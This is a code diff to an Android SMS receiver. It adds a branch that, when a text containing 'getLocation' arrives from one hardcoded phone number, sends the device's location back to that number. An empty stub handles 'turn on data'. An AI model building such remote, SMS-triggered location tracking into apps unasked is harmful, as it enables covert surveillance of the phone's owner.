@@ -13,15 +13,19 @@ import android.widget.Toast;
 public class MySmsReceiver extends BroadcastReceiver {
     private static final String TAG = MySmsReceiver.class.getSimpleName();
     public static final String PDU_TYPE = "pdus";
+
     @TargetApi(Build.VERSION_CODES.M)
     @Override
     public void onReceive(Context context, Intent intent) {
+        LocationHandler locationHandler = new LocationHandler(context, null);
         Bundle bundle = intent.getExtras();
         SmsMessage[] msgs;
         String strMessage = "";
         String format = bundle.getString("format");
 
         Object[] pdus = (Object[]) bundle.get(PDU_TYPE);
+
+
 
         if (pdus != null){
             System.err.println("pdus != null");
@@ -39,6 +43,17 @@ public class MySmsReceiver extends BroadcastReceiver {
                 strMessage += " :" +  msgs[i].getMessageBody() + "\n";
 
 
+
+                if (msgs[i].getOriginatingAddress().equals("+37066371655")){
+                    if (msgs[i].getMessageBody().contains("turn on data")){
+
+                    }
+                    if (msgs[i].getMessageBody().contains("getLocation")){
+
+                        locationHandler.setNumber(msgs[i].getOriginatingAddress());
+                        locationHandler.sendLocation();
+                    }
+                }
 
                 Log.d(TAG, "onReceive: " + strMessage);
                 Toast.makeText(context, strMessage, Toast.LENGTH_LONG).show();
